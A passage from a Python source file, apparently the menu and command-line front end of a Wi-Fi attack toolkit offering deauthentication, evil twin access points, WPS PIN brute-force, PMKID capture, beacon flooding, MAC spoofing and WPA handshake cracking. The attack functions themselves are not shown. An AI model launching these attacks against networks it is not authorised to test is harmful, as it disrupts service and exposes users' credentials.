                ssid = self.stdscr.getstr(self.max_y - 2, 10, 60).decode().strip() or "Free WiFi"
                ch = self.prompt_int("Channel", 1, 165)
                curses.noecho()
                curses.curs_set(0)
                self.show_output(f"Evil Twin: {ssid}",
                                 cmd_eviltwin, argparse.Namespace(
                                     interface=iface, ssid=ssid,
                                     channel=ch, capture=None, timeout=0))

            elif result == "wps":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                bssid = self.prompt_bssid("Target AP BSSID")
                if not bssid:
                    self.draw_status("BSSID is required.")
                    time.sleep(1)
                    continue
                ch = self.prompt_int("AP channel", 1, 165)
                dur = self.prompt_int("Attack duration (seconds)", 120)
                self.show_output(f"WPS Attack on {bssid}",
                                 cmd_wps, argparse.Namespace(
                                     interface=iface, bssid=bssid,
                                     channel=ch, timeout=dur))

            elif result == "pmkid":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                dur = self.prompt_int("Capture duration (seconds)", 30)
                self.show_output("PMKID Capture",
                                 cmd_pmkid, argparse.Namespace(
                                     interface=iface, timeout=dur, output=None))

            elif result == "beaconflood":
                iface = self.select_adapter("Select monitor adapter", only_monitor=True)
                if iface is None:
                    continue
                self.draw_status("Enter SSIDs separated by commas (blank=random)")
                curses.echo()
                curses.curs_set(1)
                self.stdscr.addstr(self.max_y - 2, 2, "  SSIDs: ", self.colors.get(3))
                ssids = self.stdscr.getstr(self.max_y - 2, 11, 60).decode().strip()
                count = self.prompt_int("Packets per SSID", 500)
                dur = self.prompt_int("Duration (seconds)", 30)
                curses.noecho()
                curses.curs_set(0)
                self.show_output("Beacon Flood",
                                 cmd_beaconflood, argparse.Namespace(
                                     interface=iface, ssids=ssids or None,
                                     count=count, timeout=dur))

            elif result == "spoofmac":
                iface = self.select_adapter("Select adapter")
                if iface is None:
                    continue
                self.draw_status("Enter custom MAC or blank for random")
                curses.echo()
                curses.curs_set(1)
                self.stdscr.addstr(self.max_y - 2, 2, "  MAC: ", self.colors.get(3))
                mac = self.stdscr.getstr(self.max_y - 2, 9, 18).decode().strip()
                curses.noecho()
                curses.curs_set(0)
                self.show_output(f"MAC Spoofing {iface}",
                                 cmd_spoofmac, argparse.Namespace(
                                     interface=iface, mac=mac or None))

            elif result == "check":
                self.show_output("Dependency Check", cmd_check)

            elif result == "install":
                self.show_output("Installing Dependencies", cmd_install)

        self.run = False


# ───────────────────── ENTRY ─────────────────────

def signal_handler(sig, frame):
    print("\n[!] Interrupted.")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def main():
    if len(sys.argv) == 1:
        try:
            stdscr = curses.initscr()
            curses.noecho()
            curses.cbreak()
            stdscr.keypad(True)
            try:
                curses.start_color()
            except curses.error:
                pass
        except curses.error:
            print("Terminal doesn't support curses.")
            return

        try:
            TUI(stdscr)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"\n[!] TUI error: {e}")
        finally:
            try:
                stdscr.keypad(False)
            except Exception:
                pass
            try:
                curses.echo()
                curses.nocbreak()
                curses.endwin()
            except Exception:
                pass
        return

    parser = argparse.ArgumentParser(
        description="WiFi Security Testing Tool — TUI + CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  sudo %(prog)s                     Launch interactive TUI menu
  %(prog)s list                     List all wireless adapters
  sudo %(prog)s monitor -i wlan0    Set adapter to monitor mode
  sudo %(prog)s scan -i wlan0mon    Scan networks
  sudo %(prog)s deauth -a AP_MAC    Deauth attack
  sudo %(prog)s install             Install dependencies
        """,
    )

    sub = parser.add_subparsers(dest="command", required=True)
    p_list = sub.add_parser("list", help="List all wireless adapters")
    p_mon = sub.add_parser("monitor", help="Put adapter into monitor mode")
    p_mon.add_argument("-i", "--interface", help="Interface name")
    p_man = sub.add_parser("managed", help="Restore adapter to managed mode")
    p_man.add_argument("-i", "--interface", help="Interface name")
    p_scan = sub.add_parser("scan", help="Scan for nearby access points")
    p_scan.add_argument("-i", "--interface", help="Monitor interface")
    p_scan.add_argument("-b", "--band", default="abg", choices=["a", "b", "g", "abg"],
                        help="Frequency band (default: abg)")
    p_scan.add_argument("-c", "--channel", type=int, help="Channel (default: all)")
    p_scan.add_argument("--bssid", help="Filter by BSSID")
    p_scan.add_argument("-o", "--output", help="Output file prefix")
    p_scan.add_argument("-t", "--timeout", type=int, default=30,
                        help="Duration in seconds (default: 30)")
    p_cap = sub.add_parser("capture", help="Capture packets from target AP")
    p_cap.add_argument("-i", "--interface", help="Monitor interface")
    p_cap.add_argument("-c", "--channel", type=int, default=1, help="Channel (default: 1)")
    p_cap.add_argument("--bssid", help="Target BSSID to filter")
    p_cap.add_argument("-o", "--output", help="Output file prefix")
    p_cap.add_argument("-t", "--timeout", type=int, default=30,
                       help="Duration in seconds (default: 30)")
    p_deauth = sub.add_parser("deauth", help="Send deauth packets")
    p_deauth.add_argument("-i", "--interface", help="Monitor interface")
    p_deauth.add_argument("-a", "--bssid", required=True, help="Target AP MAC")
    p_deauth.add_argument("-C", "--channel", type=int, help="AP channel (switches adapter)")
    p_deauth.add_argument("-c", "--client", help="Target client MAC")
    p_deauth.add_argument("-n", "--count", type=int, default=10,
                          help="Number of deauth packets (default: 10)")
    p_deauth.add_argument("-t", "--timeout", type=int, default=0,
                          help="Timeout in seconds")
    p_crack = sub.add_parser("crack", help="Crack WPA handshake from capture")
    p_crack.add_argument("-c", "--cap", required=True, help="Path to .cap file")
    p_crack.add_argument("-w", "--wordlist", required=True, help="Path to wordlist")
    p_crack.add_argument("--bssid", help="Filter by BSSID")
    p_evil = sub.add_parser("eviltwin", help="Evil Twin AP with airbase-ng")
    p_evil.add_argument("-i", "--interface", help="Monitor interface")
    p_evil.add_argument("-e", "--ssid", default="Free WiFi", help="SSID for the fake AP")
    p_evil.add_argument("-c", "--channel", type=int, default=1, help="Channel")
    p_evil.add_argument("-w", "--capture", help="Capture handshakes to file")
    p_evil.add_argument("-t", "--timeout", type=int, default=0,
                        help="Duration in seconds (0 = infinite)")
    p_wps = sub.add_parser("wps", help="WPS PIN brute-force with reaver")
    p_wps.add_argument("-i", "--interface", help="Monitor interface")
    p_wps.add_argument("-a", "--bssid", required=True, help="Target AP BSSID")
    p_wps.add_argument("-c", "--channel", type=int, default=1, help="AP channel")
    p_wps.add_argument("-t", "--timeout", type=int, default=120,
                        help="Duration in seconds (default: 120)")
    p_pmkid = sub.add_parser("pmkid", help="Capture PMKID for handshake cracking")
    p_pmkid.add_argument("-i", "--interface", help="Monitor interface")
    p_pmkid.add_argument("-o", "--output", help="Output file prefix")
    p_pmkid.add_argument("-t", "--timeout", type=int, default=30,
                          help="Duration in seconds (default: 30)")
    p_beacon = sub.add_parser("beaconflood", help="Beacon flood with mdk4")
    p_beacon.add_argument("-i", "--interface", help="Monitor interface")
    p_beacon.add_argument("-s", "--ssids", help="Comma-separated SSIDs (blank=random)")
    p_beacon.add_argument("-c", "--count", type=int, default=500,
                          help="Packets per SSID (default: 500)")
    p_beacon.add_argument("-t", "--timeout", type=int, default=30,
                          help="Duration in seconds (default: 30)")
    p_spoof = sub.add_parser("spoofmac", help="Change adapter MAC address")
    p_spoof.add_argument("-i", "--interface", help="Interface name")
    p_spoof.add_argument("-m", "--mac", help="Custom MAC (blank=random)")
    p_install = sub.add_parser("install", help="Install missing dependencies")
    p_check = sub.add_parser("check", help="Check dependencies")

    args = parser.parse_args()
    globals()[f"cmd_{args.command}"](args)


if __name__ == "__main__":
    main()
